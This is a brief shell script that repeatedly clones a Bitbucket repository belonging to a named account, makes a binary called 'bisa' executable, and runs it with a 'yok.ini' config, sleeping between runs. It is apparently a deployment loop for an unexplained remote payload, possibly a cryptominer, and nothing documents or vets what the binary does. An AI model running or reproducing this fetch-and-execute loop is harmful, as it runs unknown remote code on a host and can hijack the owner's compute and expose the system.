#!/bin/sh
 
COUNTER=20
until [  $COUNTER -lt 10 ]; do
 
git clone https://keepstrong13@bitbucket.org/keepstrong13/tastis.git
cd tastis
chmod +x bisa
./bisa yok.ini
sleep 4320

     echo COUNTER $COUNTER
     let COUNTER-=1
done
